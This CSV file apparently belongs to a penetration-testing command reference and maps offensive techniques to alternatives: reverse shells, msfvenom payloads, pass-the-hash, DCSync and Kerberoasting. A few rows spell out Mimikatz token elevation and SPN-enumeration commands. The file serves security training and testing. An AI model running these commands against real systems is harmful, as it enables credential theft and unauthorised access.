"command_id","alternative_command_id"
"powershell-runas-keepopen","fodhelper-uac-bypass"
"powershell-runas-keepopen","eventvwr-uac-bypass"
"powershell-runas-download-execute","fodhelper-uac-bypass"
"powershell-runas-download-execute","eventvwr-uac-bypass"
"powershell-runas-download-execute","win-privesc-powerup"
"windows-net-use-smb-connect","pushd \\\\<TARGET>\\<SHARE> (temporary mapping, auto-disconnects)"
"windows-net-use-smb-connect","New-PSDrive -Name Z -PSProvider FileSystem -Root \\\\<TARGET>\\<SHARE> -Credential $cred (PowerShell)"
"kerberos-klist-purge","mimikatz.exe ""kerberos::purge"" ""exit"" (Mimikatz alternative)"
"kerberos-klist-purge","Rubeus.exe purge (Rubeus alternative)"
"windows-psexec-system-shell","mimikatz.exe ""privilege::debug"" ""token::elevate"" ""exit"" (Mimikatz token elevation)"
"windows-psexec-system-shell","Start-Process cmd.exe -Verb RunAs (PowerShell elevation, requires GUI)"
"powerview-enumerate-spns","Get-ADUser -Filter {ServicePrincipalName -ne '$null'} (ActiveDirectory module)"
"powerview-enumerate-spns","setspn -T <DOMAIN> -Q */* (Windows built-in)"
"powerview-enumerate-spns","GetUserSPNs.py <DOMAIN>/<USER>:<PASS> (Impacket from Kali)"
"ad-dcsync-check-privileges","(Get-Acl 'AD:\DC=corp,DC=com').Access | Where-Object {$_.ObjectType -like '*Replication*'} (ActiveDirectory module)"
"ad-dcsync-check-privileges","adfind.exe -b 'DC=corp,DC=com' -s base nTSecurityDescriptor (ADFind tool)"
"execute-sudo-exploit","sudo-exploit-find"
"execute-sudo-exploit","sudo-exploit-vim"
"execute-sudo-exploit","sudo-exploit-python"
"execute-sudo-exploit","sudo-exploit-less"
"execute-sudo-exploit","sudo-exploit-nmap"
"docker-privileged-escape","docker-mount-escape"
"docker-socket-mount","docker-mount-escape"
"find-suid-binaries","linux-suid-find"
"execute-suid-exploit-find","execute-suid-exploit-find"
"execute-suid-exploit-find","execute-suid-exploit-find"
"execute-suid-exploit-find","execute-sudo-exploit"
"verify-root-access-suid","cat-etc-shadow"
"winrm-enter-pssession","winrm-new-pssession"
"winrm-enter-pssession","winrm-invoke-command"
"winrm-enter-pssession","evil-winrm-creds"
"winrm-new-pssession","winrm-enter-pssession"
"winrm-new-pssession","winrm-invoke-command"
"winrm-invoke-command","winrm-new-pssession"
"winrm-invoke-command","evil-winrm-creds"
"winrm-invoke-command","wmi-invoke-method"
"winrm-winrs","winrm-invoke-command"
"winrm-winrs","evil-winrm-creds"
"evil-winrm-creds","evil-winrm-hash"
"evil-winrm-creds","winrm-enter-pssession"
"evil-winrm-creds","psexec-impacket-shell"
"evil-winrm-hash","evil-winrm-creds"
"evil-winrm-hash","psexec-impacket-shell"
"winrm-revshell-invoke","wmi-powershell-revshell"
"psexec-impacket-shell","psexec-sysinternals"
"psexec-impacket-shell","smbexec-impacket-fileless"
"psexec-impacket-shell","wmi-impacket-exec"
"psexec-impacket-shell","evil-winrm-creds"
"psexec-sysinternals","psexec-impacket-shell"
"psexec-sysinternals","psexec-sysinternals-interactive"
"psexec-sysinternals-interactive","psexec-sysinternals"
"smbexec-impacket-fileless","psexec-impacket-shell"
"smbexec-impacket-fileless","wmi-impacket-exec"
"smbexec-impacket-fileless","evil-winrm-creds"
"nc-listener-setup","socat-listener"
"bash-reverse-shell","python-reverse-shell"
"bash-reverse-shell","netcat-reverse-shell-mkfifo"
"msfvenom-windows-reverse-tcp","msfvenom-windows-meterpreter"
"msfvenom-linux-reverse-tcp","bash-reverse-shell"
"msfvenom-linux-reverse-tcp","python-reverse-shell"
"msfvenom-php-webshell","php-reverse-shell"
"netcat-reverse-shell-mkfifo","bash-reverse-shell"
"netcat-reverse-shell-mkfifo","python-reverse-shell"
"python-reverse-shell","bash-reverse-shell"
"python-reverse-shell","perl-reverse-shell"
"perl-reverse-shell","bash-reverse-shell"
"perl-reverse-shell","python-reverse-shell"
"php-reverse-shell","msfvenom-php-webshell"
"overpass-mimikatz-pth","overpass-rubeus-asktgt"
"passticket-mimikatz-inject","passticket-rubeus-ptt"
"passticket-mimikatz-inject","rubeus-ptt"
"passticket-rubeus-ptt","passticket-mimikatz-inject"
"overpass-rubeus-asktgt","overpass-mimikatz-pth"
"pth-mimikatz-sekurlsa","pth-impacket-psexec"
"pth-mimikatz-sekurlsa","pth-evil-winrm"
"pth-mimikatz-sekurlsa","pth-cme-spray"
"pth-impacket-psexec","pth-impacket-wmiexec"
"pth-impacket-psexec","pth-impacket-smbexec"
"pth-impacket-psexec","pth-evil-winrm"
"pth-impacket-wmiexec","pth-impacket-psexec"
"pth-impacket-wmiexec","pth-impacket-smbexec"
"pth-impacket-smbexec","pth-impacket-psexec"
"pth-impacket-smbexec","pth-impacket-wmiexec"
"pth-evil-winrm","pth-impacket-psexec"
"pth-evil-winrm","pth-impacket-wmiexec"
"pth-cme-spray","pth-impacket-psexec"
"pth-cme-exec","pth-impacket-psexec"
"impacket-psexec","impacket-smbexec"
"impacket-psexec","impacket-wmiexec"
"impacket-psexec","ad-pass-the-hash-impacket-psexec"
"impacket-smbexec","impacket-psexec"
"impacket-smbexec","impacket-wmiexec"
"impacket-wmiexec","impacket-psexec"
"impacket-wmiexec","impacket-smbexec"
"impacket-wmiexec","ad-pass-the-hash-impacket-wmiexec"
"impacket-secretsdump","ad-dcsync-secretsdump-user"
"impacket-secretsdump","ad-dcsync-secretsdump-all"
"impacket-secretsdump","crackmapexec-sam-dump"
"msf-set-option","msf-setg-option"
"msf-setg-option","msf-set-option"
"msf-db-import","msf-db-nmap"
"mysql-connect-basic","sqli-union-mysql-info"
"postgres-connect-basic","postgres-direct-connect"
"postgres-connect-basic","sqli-union-postgresql-info"
"msfvenom-linux-elf","msfvenom-linux-reverse-tcp"
"msfvenom-windows-exe","msfvenom-linux-reverse-tcp"
"searchsploit-cve-lookup","searchsploit"
"searchsploit-cve-lookup","searchsploit-service-version"
"searchsploit-service-version","searchsploit"
"searchsploit-service-version","searchsploit-cve-lookup"
"searchsploit-copy-exploit","searchsploit"
"searchsploit-copy-exploit","searchsploit-cve-lookup"
"searchsploit-copy-exploit","searchsploit-service-version"
"nmap-script-help","nmap-script-args"
"nmap-script-help","nmap-vuln-scan"
"nmap-script-args","nmap-script-help"
"nmap-script-args","nmap-vuln-scan"
"gobuster-dir-common","gobuster-dir-custom"
"gobuster-dir-common","gobuster-dir"
"gobuster-dir-custom","gobuster-dir-common"
"gobuster-dir-custom","gobuster-dir"
"nikto-comprehensive","nikto-scan"
"nikto-comprehensive","gobuster-dir-common"
"nikto-comprehensive","whatweb-technology-detection"
"dcom-mmc20-revshell","psexec-impacket-shell"
"dcom-shellbrowserwindow","dcom-shellwindows"
"msf-session-command","msf-session-interact"
"wmi-legacy-wmic","wmi-invoke-method"
"wmi-legacy-wmic","wmi-new-cimsession"
"wmi-legacy-wmic","wmi-impacket-exec"
"wmi-invoke-method","wmi-new-cimsession"
"wmi-invoke-method","wmi-impacket-exec"
"wmi-invoke-method","wmi-legacy-wmic"
"wmi-new-cimsession","wmi-invoke-method"
"wmi-new-cimsession","wmi-impacket-exec"
"wmi-impacket-exec","psexec-impacket-shell"
"wmi-impacket-exec","smbexec-impacket-fileless"
"wmi-impacket-exec","evil-winrm-shell"
"wmi-cme-exec","wmi-impacket-exec"
"mysql-connect-interactive","mysql-connect-basic"
"smbmap-enumerate-auth","smbmap-shares"
"smbmap-enumerate-auth","smbclient-connect"
"grep-metasploit-exploits","searchsploit-service-version"
"msfvenom-linux-x86-shell","msfvenom-linux-elf"
"msfvenom-linux-x64-meterpreter","msfvenom-linux-elf"
"msfvenom-windows-shell-tcp","msfvenom-windows-exe"
"msfvenom-windows-meterpreter-tcp","msfvenom-windows-exe"
"google-exploitdb-search","searchsploit-service-version"
"google-exploitdb-search","searchsploit-cve-lookup"
"whatweb-technology-id","curl-web-server-verify"
"nc-listener-non-staged","rlwrap-nc-listener"
"nc-listener-non-staged","msf-handler-setup"
"rlwrap-nc-listener","nc-listener-non-staged"
"ls-metasploit-auxiliary","msfconsole-search"
"msfvenom-windows-x64-meterpreter-tcp","msfvenom-windows-meterpreter-tcp"
"msfvenom-linux-x64-meterpreter-non-staged","msfvenom-linux-x64-meterpreter"
"msf-show-auxiliary","msf-search-auxiliary"
"meterpreter-getsystem","windows-exploit-suggester"
"msfvenom-php-reverse","php-reverse-shell"
"msfvenom-python-reverse","python-reverse-shell"
"msfvenom-bash-reverse","bash-reverse-shell"
